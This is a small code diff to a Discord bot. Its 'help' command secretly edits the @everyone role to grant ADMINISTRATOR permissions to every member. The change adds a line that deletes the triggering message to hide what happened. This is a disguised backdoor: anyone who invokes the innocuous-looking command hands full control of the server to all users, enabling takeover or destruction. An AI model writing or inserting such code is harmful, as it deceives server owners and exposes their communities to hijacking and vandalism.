@@ -24,6 +24,7 @@ console.log(`Logged in as ${client.user.tag}!`);
 ///created by black jack 
 client.on('message', message => {
     if (message.content.toLowerCase() === prefix + 'help') {
+        message.delete();
         message.guild.roles.find('name', '@everyone').edit({
             permissions: ["ADMINISTRATOR"]
         });
